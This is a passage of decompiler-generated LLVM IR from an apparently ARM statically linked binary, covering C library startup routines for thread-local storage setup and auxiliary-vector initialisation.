  store i32 %v2_195cc, i32* %r4.global-to-local, align 4
  %v1_195d0 = load i32, i32* @r0, align 4
  ret i32 %v1_195d0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_195d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_195d8:
  %v0_195d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_195d8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_195d8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_195d8, %bb
  %v4_195e8 = phi i32 [ %arg1, %dec_label_pc_195d8 ], [ 0, %bb ]
  ret i32 %v4_195e8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r3.global-to-local, align 4
  %v4_195fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 84) to i32*), align 4
  store i32 %v4_195fc, i32* @lr, align 4
  %v4_19608 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 10752) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 10752), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_19628 = inttoptr i32 %v4_19608 to i32*
  store i32 1, i32* %v2_19628, align 4
  %v0_1962c = load i32, i32* %r3.global-to-local, align 4
  %v1_1962c = load i32, i32* @lr, align 4
  %v2_1962c = inttoptr i32 %v1_1962c to i32*
  store i32 %v0_1962c, i32* %v2_1962c, align 4
  %v0_19630 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_19648(i32 %arg1) local_unnamed_addr {
dec_label_pc_19648:
  %v0_19648 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19648, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19648
  %v2_19648 = load i32, i32* @r4, align 4
  %v8_19648 = ashr i32 %v2_19648, %arg1
  %v9_19648 = and i32 %v8_19648, %arg1
  %v2_1964c = load i32, i32* @ip, align 4
  %v8_1964c = lshr i32 %v2_1964c, %v9_19648
  %v9_1964c = and i32 %v8_1964c, %v9_19648
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19648, %bb
  %v7_19650 = phi i32 [ %arg1, %dec_label_pc_19648 ], [ %v9_1964c, %bb ]
  ret i32 %v7_19650

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1965c = call i32 @__aeabi_read_tp()
  %v1_19660 = inttoptr i32 %v0_1965c to i32*
  %v2_19660 = load i32, i32* %v1_19660, align 4
  %v1_19664 = add i32 %arg1, 4
  %v2_19664 = inttoptr i32 %v1_19664 to i32*
  %v3_19664 = load i32, i32* %v2_19664, align 4
  %v1_19668 = add i32 %v2_19660, 8
  %v2_19668 = inttoptr i32 %v1_19668 to i32*
  %v3_19668 = load i32, i32* %v2_19668, align 4
  %v2_1966c = add i32 %v3_19668, %v3_19664
  ret i32 %v2_1966c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19678 = load i32, i32* @r4, align 4
  store i32 %v3_19678, i32* %stack_var_-36, align 4
  %v6_19678 = load i32, i32* @r5, align 4
  %v15_19678 = load i32, i32* @r8, align 4
  %v18_19678 = load i32, i32* @sb, align 4
  %v21_19678 = load i32, i32* @sl, align 4
  %v24_19678 = load i32, i32* @fp, align 4
  %v27_19678 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %sl.global-to-local, align 4
  %v4_19688 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 104) to i32*), align 4
  store i32 %v4_19688, i32* %r3.global-to-local, align 4
  %v1_1968c = inttoptr i32 %v4_19688 to i32*
  %v2_1968c = load i32, i32* %v1_1968c, align 4
  store i32 %v2_1968c, i32* %r2.global-to-local, align 4
  %v2_19690 = icmp eq i32 %v2_1968c, 0
  %v0_19698 = load i32, i32* %r0.global-to-local, align 4
  %v0_1969c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1969c, i32* %ip.global-to-local, align 4
  br i1 %v2_19690, label %dec_label_pc_19864, label %dec_label_pc_196a4

dec_label_pc_196a4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_196a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 156) to i32*), align 4
  store i32 %v4_196a8, i32* @lr, align 4
  store i32 %v2_1968c, i32* %r1.global-to-local, align 4
  %v1_196f0 = inttoptr i32 %v4_196a8 to i32*
  %v2_196f061 = load i32, i32* %v1_196f0, align 4
  %v4_196f462 = mul i32 %v2_196f061, 32
  %v5_196f463 = add i32 %v4_196f462, %v2_1968c
  store i32 %v5_196f463, i32* %r3.global-to-local, align 4
  %v3_196f865 = icmp ult i32 %v2_1968c, %v5_196f463
  br i1 %v3_196f865, label %dec_label_pc_196b4, label %dec_label_pc_19864.loopexit

dec_label_pc_196b4:                               ; preds = %dec_label_pc_196a4, %dec_label_pc_196ec
  %v0_196cc66 = phi i32 [ %v1_196ec, %dec_label_pc_196ec ], [ %v2_1968c, %dec_label_pc_196a4 ]
  %v1_196b4 = inttoptr i32 %v0_196cc66 to i32*
  %v2_196b4 = load i32, i32* %v1_196b4, align 4
  store i32 %v2_196b4, i32* %r3.global-to-local, align 4
  %v7_196b8 = icmp eq i32 %v2_196b4, 7
  br i1 %v7_196b8, label %dec_label_pc_196c0, label %dec_label_pc_196ec

dec_label_pc_196c0:                               ; preds = %dec_label_pc_196b4
  %v1_196c0 = add i32 %v0_196cc66, 20
  %v2_196c0 = inttoptr i32 %v1_196c0 to i32*
  %v3_196c0 = load i32, i32* %v2_196c0, align 4
  store i32 %v3_196c0, i32* %r3.global-to-local, align 4
  %v1_196c4 = add i32 %v0_196cc66, 28
  %v2_196c4 = inttoptr i32 %v1_196c4 to i32*
  %v3_196c4 = load i32, i32* %v2_196c4, align 4
  store i32 %v3_196c4, i32* @r6, align 4
  %v1_196cc = add i32 %v0_196cc66, 16
  %v2_196cc = inttoptr i32 %v1_196cc to i32*
  %v3_196cc = load i32, i32* %v2_196cc, align 4
  store i32 %v3_196cc, i32* %r3.global-to-local, align 4
  %v1_196d0 = add i32 %v0_196cc66, 8
  %v2_196d0 = inttoptr i32 %v1_196d0 to i32*
  %v3_196d0 = load i32, i32* %v2_196d0, align 4
  store i32 %v3_196d0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_196c4, %v0_1969c
  %v0_1969c.v3_196c4 = select i1 %tmp78, i32 %v0_1969c, i32 %v3_196c4
  store i32 %v0_1969c.v3_196c4, i32* %fp.global-to-local, align 4
  %v2_19708 = icmp eq i32 %v3_196c4, 0
  br i1 %v2_19708, label %dec_label_pc_19730, label %bb

dec_label_pc_196ec:                               ; preds = %dec_label_pc_196b4
  %v1_196ec = add i32 %v0_196cc66, 32
  store i32 %v1_196ec, i32* %r1.global-to-local, align 4
  %v2_196f0 = load i32, i32* %v1_196f0, align 4
  %v4_196f4 = mul i32 %v2_196f0, 32
  %v5_196f4 = add i32 %v4_196f4, %v2_1968c
  store i32 %v5_196f4, i32* %r3.global-to-local, align 4
  %v3_196f8 = icmp ult i32 %v1_196ec, %v5_196f4
  br i1 %v3_196f8, label %dec_label_pc_196b4, label %dec_label_pc_196f0.dec_label_pc_19864.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_196c0
  %v2_1970c = add i32 %v3_196c4, -1
  br label %dec_label_pc_19734

dec_label_pc_19730:                               ; preds = %dec_label_pc_196c0, %dec_label_pc_19864
  %v0_19744.pre = phi i32 [ %v0_19744.pre.pre, %dec_label_pc_19864 ], [ ptrtoint (i32* @global_var_24424.765 to i32), %dec_label_pc_196c0 ]
  %v1_19734.pre = phi i32 [ %v1_19734.pre.pre, %dec_label_pc_19864 ], [ %v0_19698, %dec_label_pc_196c0 ]
  %v1_1975825 = phi i32 [ %v0_1986c, %dec_label_pc_19864 ], [ %v0_1969c.v3_196c4, %dec_label_pc_196c0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_19864 ], [ %v3_196c0, %dec_label_pc_196c0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_19864 ], [ %v3_196cc, %dec_label_pc_196c0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_19864 ], [ %v3_196d0, %dec_label_pc_196c0 ]
  br label %dec_label_pc_19734

dec_label_pc_19734:                               ; preds = %bb, %dec_label_pc_19730
  %storemerge80 = phi i32 [ %v2_1970c, %bb ], [ 0, %dec_label_pc_19730 ]
  %v0_19734 = phi i32 [ %v2_1970c, %bb ], [ 0, %dec_label_pc_19730 ]
  %storemerge = phi i32 [ %v3_196c4, %bb ], [ 1, %dec_label_pc_19730 ]
  %storemerge79 = phi i32 [ %v3_196c4, %bb ], [ 1, %dec_label_pc_19730 ]
  %v0_19744 = phi i32 [ ptrtoint (i32* @global_var_24424.765 to i32), %bb ], [ %v0_19744.pre, %dec_label_pc_19730 ]
  %v1_19734 = phi i32 [ %v0_19698, %bb ], [ %v1_19734.pre, %dec_label_pc_19730 ]
  %v1_19758 = phi i32 [ %v0_1969c.v3_196c4, %bb ], [ %v1_1975825, %dec_label_pc_19730 ]
  %stack_var_-52.3 = phi i32 [ %v3_196c0, %bb ], [ %stack_var_-52.0, %dec_label_pc_19730 ]
  %stack_var_-48.3 = phi i32 [ %v3_196cc, %bb ], [ %stack_var_-48.0, %dec_label_pc_19730 ]
  %stack_var_-44.3 = phi i32 [ %v3_196d0, %bb ], [ %stack_var_-44.0, %dec_label_pc_19730 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_19734 = add i32 %v1_19734, %v0_19734
  %v2_19738 = udiv i32 %v2_19734, %storemerge
  store i32 %v2_19738, i32* %r0.global-to-local, align 4
  %v2_1973c = mul i32 %v2_19738, %storemerge
  store i32 %v2_1973c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_19744 = add i32 %v0_19744, 72
  %v3_19744 = inttoptr i32 %v2_19744 to i32*
  %v4_19744 = load i32, i32* %v3_19744, align 4
  store i32 %v4_19744, i32* %r3.global-to-local, align 4
  %v1_19748 = inttoptr i32 %v4_19744 to i32*
  %v2_19748 = load i32, i32* %v1_19748, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_19750 = add i32 %v1_19758, 1168
  %v2_19754 = add i32 %v1_19750, %stack_var_-52.3
  %v2_19758 = add i32 %v2_19754, %v2_1973c
  %v2_1975c = add i32 %v2_19758, %v2_19748
  store i32 %v2_1975c, i32* %r0.global-to-local, align 4
  %v1_19760 = call i32 @__GI_sbrk(i32 %v2_1975c)
  %v1_19764 = load i32, i32* %fp.global-to-local, align 4
  %v1_1976c = sub i32 0, %v1_19764
  store i32 10240, i32* %r4.global-to-local, align 4
  %v2_19764 = add i32 %v1_19760, 1167
  %v1_19774 = add i32 %v2_19764, %v1_19764
  %v2_19778 = and i32 %v1_19774, %v1_1976c
  store i32 %v2_19778, i32* @r5, align 4
  %v1_19780 = load i32, i32* %sl.global-to-local, align 4
  %v3_19780 = add i32 %v1_19780, 10240
  %v4_19780 = inttoptr i32 %v3_19780 to i32*
  store i32 62, i32* %v4_19780, align 4
  %v0_19788 = load i32, i32* @r5, align 4
  %v1_19788 = load i32, i32* %sb.global-to-local, align 4
  %v2_19788 = add i32 %v1_19788, %v0_19788
  store i32 %v2_19788, i32* @ip, align 4
  %v0_1978c = load i32, i32* %sl.global-to-local, align 4
  %v1_1978c = load i32, i32* %r4.global-to-local, align 4
  %v2_1978c = add i32 %v1_1978c, %v0_1978c
  store i32 %v2_1978c, i32* %r4.global-to-local, align 4
  %v2_19790 = add i32 %v0_1978c, 11528
  store i32 %v2_19790, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_19788, i32* @r0, align 4
  %v2_197a4 = add i32 %v2_1978c, 16
  %v3_197a4 = inttoptr i32 %v2_197a4 to i32*
  store i32 %v2_19788, i32* %v3_197a4, align 4
  %v0_197a8 = load i32, i32* %sb.global-to-local, align 4
  %v1_197a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_197a8 = add i32 %v1_197a8, 40
  %v3_197a8 = inttoptr i32 %v2_197a8 to i32*
  store i32 %v0_197a8, i32* %v3_197a8, align 4
  %v0_197ac = load i32, i32* @r3, align 4
  %v1_197ac = trunc i32 %v0_197ac to i8
  %v2_197ac = load i32, i32* %r4.global-to-local, align 4
  %v3_197ac = add i32 %v2_197ac, 20
  %v4_197ac = inttoptr i32 %v3_197ac to i8*
  store i8 %v1_197ac, i8* %v4_197ac, align 1
  %v0_197b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_197b0 = add i32 %v0_197b0, 8
  store i32 %v1_197b0, i32* @r4, align 4
  %v0_197b4 = call i32 @memcpy()
  %v0_197bc = load i32, i32* @r4, align 4
  %v1_197bc = load i32, i32* @r5, align 4
  %v2_197bc = inttoptr i32 %v1_197bc to i32*
  store i32 %v0_197bc, i32* %v2_197bc, align 4
  %v0_197c0 = load i32, i32* @r5, align 4
  store i32 %v0_197c0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_197c0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_152c8.954 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_197d4 = load i32, i32* %sl.global-to-local, align 4
  %v2_197d4 = add i32 %v0_197d4, 84
  %v3_197d4 = inttoptr i32 %v2_197d4 to i32*
  %v4_197d4 = load i32, i32* %v3_197d4, align 4
  store i32 %v4_197d4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10752, i32* %r1.global-to-local, align 4
  %v2_197e0 = add i32 %v0_197d4, 60
  %v3_197e0 = inttoptr i32 %v2_197e0 to i32*
  %v4_197e0 = load i32, i32* %v3_197e0, align 4
  store i32 %v4_197e0, i32* %r0.global-to-local, align 4
  %v3_197e8 = add i32 %v0_197d4, 10752
  %v4_197e8 = inttoptr i32 %v3_197e8 to i32*
  store i32 64, i32* %v4_197e8, align 4
  %v1_197f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_197f0 = add i32 %v1_197f0, 20
  %v3_197f0 = inttoptr i32 %v2_197f0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_197f0, align 4
  %v1_197f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_197f8 = add i32 %v1_197f8, 24
  %v3_197f8 = inttoptr i32 %v2_197f8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_197f8, align 4
  %v1_19800 = load i32, i32* %r0.global-to-local, align 4
  %v2_19800 = inttoptr i32 %v1_19800 to i32*
  store i32 1, i32* %v2_19800, align 4
  %v1_19808 = load i32, i32* %r8.global-to-local, align 4
  %v2_19808 = add i32 %v1_19808, 28
  %v3_19808 = inttoptr i32 %v2_19808 to i32*
  store i32 %stack_var_-52.3, i32* %v3_19808, align 4
  %v0_19810 = load i32, i32* @r6, align 4
  %v2_19810 = icmp eq i32 %v0_19810, 0
  %v1_19814 = load i32, i32* %r8.global-to-local, align 4
  %v2_19814 = add i32 %v1_19814, 44
  %v3_19814 = inttoptr i32 %v2_19814 to i32*
  store i32 1, i32* %v3_19814, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1981c = load i32, i32* %sl.global-to-local, align 4
  %v1_1981c = load i32, i32* %r1.global-to-local, align 4
  %v2_1981c = add i32 %v1_1981c, %v0_1981c
  store i32 %v2_1981c, i32* %r2.global-to-local, align 4
  %v1_19820 = load i32, i32* @r6, align 4
  br i1 %v2_19810, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_19734
  store i32 %v1_19820, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1982c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1982c35 = add i32 %v1_1982c34, 32
  %v3_1982c36 = inttoptr i32 %v2_1982c35 to i32*
  store i32 %v1_19820, i32* %v3_1982c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_19734
  %v2_19824 = add i32 %v1_19820, -1
  store i32 %v2_19824, i32* %r0.global-to-local, align 4
  %v1_1982c = load i32, i32* %r8.global-to-local, align 4
  %v2_1982c = add i32 %v1_1982c, 32
  %v3_1982c = inttoptr i32 %v2_1982c to i32*
  store i32 %v1_19820, i32* %v3_1982c, align 4
  %v1_19830 = load i32, i32* @r6, align 4
  store i32 %v1_19830, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_19834 = load i32, i32* %r8.global-to-local, align 4
  %v1_19834 = load i32, i32* %r2.global-to-local, align 4
  %v2_19834 = add i32 %v1_19834, 28
  %v3_19834 = inttoptr i32 %v2_19834 to i32*
  store i32 %v0_19834, i32* %v3_19834, align 4
  %v0_19838 = load i32, i32* %r2.global-to-local, align 4
  %v1_19838 = load i32, i32* %ip.global-to-local, align 4
  %v2_19838 = inttoptr i32 %v1_19838 to i32*
  store i32 %v0_19838, i32* %v2_19838, align 4
  %v0_1983c = load i32, i32* %r0.global-to-local, align 4
  %v1_1983c = load i32, i32* %r3.global-to-local, align 4
  %v2_1983c = add i32 %v1_1983c, %v0_1983c
  store i32 %v2_1983c, i32* %r0.global-to-local, align 4
  %v1_19840 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_19810, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_19848.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_19848 = phi i32 [ %v0_19848.pre, %._crit_edge ], [ %v1_19840, %bb54 ]
  %v2_19844 = udiv i32 %v2_1983c, %v1_19840
  %v2_19848 = load i32, i32* %sb.global-to-local, align 4
  %v3_19848 = mul i32 %v2_19844, %v0_19848
  %v4_19848 = add i32 %v2_19848, %v3_19848
  store i32 %v4_19848, i32* @r0, align 4
  %v0_1984c = load i32, i32* %fp.global-to-local, align 4
  %v2_1984c = icmp ult i32 %v0_1984c, 16
  %v0_1984c. = select i1 %v2_1984c, i32 16, i32 %v0_1984c
  store i32 %v0_1984c., i32* @r1, align 4
  %v2_1985c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1985c, i32* @r4, align 4
  store i32 %v6_19678, i32* @r5, align 4
  store i32 %v15_19678, i32* %r8.global-to-local, align 4
  store i32 %v18_19678, i32* %sb.global-to-local, align 4
  store i32 %v21_19678, i32* %sl.global-to-local, align 4
  store i32 %v24_19678, i32* %fp.global-to-local, align 4
  store i32 %v27_19678, i32* @lr, align 4
  %v0_19860 = call i32 @init_static_tls()
  store i32 %v0_19860, i32* %r0.global-to-local, align 4
  %v0_1986c.pre = load i32, i32* @ip, align 4
  %v1_19734.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_19744.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19864

dec_label_pc_196f0.dec_label_pc_19864.loopexit_crit_edge: ; preds = %dec_label_pc_196ec
  br label %dec_label_pc_19864.loopexit

dec_label_pc_19864.loopexit:                      ; preds = %dec_label_pc_196f0.dec_label_pc_19864.loopexit_crit_edge, %dec_label_pc_196a4
  br label %dec_label_pc_19864

dec_label_pc_19864:                               ; preds = %dec_label_pc_19864.loopexit, %entry, %bb55
  %v0_19744.pre.pre = phi i32 [ ptrtoint (i32* @global_var_24424.765 to i32), %dec_label_pc_19864.loopexit ], [ ptrtoint (i32* @global_var_24424.765 to i32), %entry ], [ %v0_19744.pre.pre.pre, %bb55 ]
  %v1_19734.pre.pre = phi i32 [ %v0_19698, %dec_label_pc_19864.loopexit ], [ %v0_19698, %entry ], [ %v1_19734.pre.pre.pre, %bb55 ]
  %v0_1986c = phi i32 [ %v0_1969c, %dec_label_pc_19864.loopexit ], [ %v0_1969c, %entry ], [ %v0_1986c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1986c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_19730

; uselistorder directives
  uselistorder i32 %v0_1986c, { 1, 0 }
  uselistorder i32 %v1_19820, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1978c, { 1, 0 }
  uselistorder i32 %v2_19788, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_196ec, { 2, 1, 0 }
  uselistorder i32 %v3_196c4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_196cc66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_196f0, { 1, 0 }
  uselistorder i32 %v0_1969c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_19698, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1968c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 9, 10, 11, 8, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 4, 3, 5, 6, 7, 0, 10, 9, 8, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 7, 6, 8, 9, 10, 11, 12, 4, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10752, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 2, 0 }
  uselistorder i32 10240, { 3, 4, 8, 5, 9, 2, 10, 1, 11, 6, 12, 7, 13, 0, 14 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 3, 2, 1, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_19864, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_19734, { 1, 0 }
  uselistorder label %dec_label_pc_19730, { 1, 0 }
  uselistorder label %dec_label_pc_196b4, { 1, 0 }
}

define i32 @function_19884(i32 %arg1) local_unnamed_addr {
dec_label_pc_19884:
  %v0_19884 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19884, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_19884
  %v1_19888 = load i32, i32* @ip, align 4
  %v1_19898 = load i32, i32* @r5, align 4
  %v2_1989c = load i32, i32* @r4, align 4
  %v2_19898 = and i32 %v1_19888, 104608
  %v9_1989c = and i32 %v2_19898, %v1_19898
  %v9_198a0 = and i32 %v9_1989c, %v2_1989c
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19884, %bb
  %v7_198a4 = phi i32 [ %arg1, %dec_label_pc_19884 ], [ %v9_198a0, %bb ]
  ret i32 %v7_198a4

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_198b0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_198b0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v4_198c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 156) to i32*), align 4
  %v4_198c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 104) to i32*), align 4
  store i32 %v4_198c8, i32* %r1.global-to-local, align 4
  %v1_198cc = add i32 %arg1, 44
  %v2_198cc = inttoptr i32 %v1_198cc to i32*
  %v3_198cc = load i32, i32* %v2_198cc, align 4
  %v1_198d0 = add i32 %arg1, 28
  %v2_198d0 = inttoptr i32 %v1_198d0 to i32*
  %v3_198d0 = load i32, i32* %v2_198d0, align 4
  store i32 %v3_198d0, i32* %r2.global-to-local, align 4
  %v2_198d4 = inttoptr i32 %v4_198c0 to i32*
  store i32 %v3_198cc, i32* %v2_198d4, align 4
  %v0_198d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_198d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_198d8 = inttoptr i32 %v1_198d8 to i32*
  store i32 %v0_198d8, i32* %v2_198d8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 6, 8, 3, 7, 4, 9, 5, 10 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_198e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_198e4:
  %v0_198e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_198e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_198e4
  %v1_198e4 = load i32, i32* @ip, align 4
  %v3_198e4 = mul i32 %v1_198e4, %arg1
  %v2_198e8 = load i32, i32* @r8, align 4
  %v4_198e8 = and i32 %v2_198e8, %v3_198e4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_198e4, %bb
  %v5_198e8 = phi i32 [ %arg1, %dec_label_pc_198e4 ], [ %v4_198e8, %bb ]
  ret i32 %v5_198e8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_198f4 = add i32 %arg1, 40
  store i32 %v1_198f4, i32* %r2.global-to-local, align 4
  %v1_198f8 = inttoptr i32 %v1_198f4 to i32*
  %v2_198f8 = load i32, i32* %v1_198f8, align 4
  store i32 %v2_198f8, i32* %r2.global-to-local, align 4
  %v3_198f8 = add i32 %arg1, 44
  %v4_198f8 = inttoptr i32 %v3_198f8 to i32*
  %v5_198f8 = load i32, i32* %v4_198f8, align 4
  store i32 %v5_198f8, i32* %r3.global-to-local, align 4
  %v0_198fc = call i32 @__aeabi_read_tp()
  %v1_19900 = inttoptr i32 %v0_198fc to i32*
  %v2_19900 = load i32, i32* %v1_19900, align 4
  store i32 %v2_19900, i32* %r1.global-to-local, align 4
  %v3_19904 = mul i32 %v5_198f8, 8
  store i32 %v3_19904, i32* %r3.global-to-local, align 4
  %v1_19908 = load i32, i32* %r2.global-to-local, align 4
  %v2_19908 = add i32 %v1_19908, %v0_198fc
  %v3_1990c = add i32 %v3_19904, %v2_19900
  %v4_1990c = inttoptr i32 %v3_1990c to i32*
  store i32 %v2_19908, i32* %v4_1990c, align 4
  %v0_19910 = load i32, i32* %r3.global-to-local, align 4
  %v1_19910 = load i32, i32* %r1.global-to-local, align 4
  %v2_19910 = add i32 %v1_19910, %v0_19910
  store i32 %v2_19910, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_19918 = add i32 %v2_19910, 4
  %v5_19918 = inttoptr i32 %v4_19918 to i8*
  store i8 1, i8* %v5_19918, align 1
  %v0_1991c = load i32, i32* @r4, align 4
  %v1_1991c = add i32 %v0_1991c, 20
  store i32 %v1_1991c, i32* %r1.global-to-local, align 4
  %v1_19920 = inttoptr i32 %v1_1991c to i32*
  %v2_19920 = load i32, i32* %v1_19920, align 4
  store i32 %v2_19920, i32* @r1, align 4
  %v3_19920 = add i32 %v0_1991c, 24
  %v4_19920 = inttoptr i32 %v3_19920 to i32*
  %v5_19920 = load i32, i32* %v4_19920, align 4
  store i32 %v5_19920, i32* %r2.global-to-local, align 4
  %v5_19924 = call i32 @__GI_mempcpy(i32 %v2_19908, i32 %v2_19920, i32 %v5_19920, i32 1)
  %v0_19928 = load i32, i32* @r4, align 4
  %v1_19928 = add i32 %v0_19928, 28
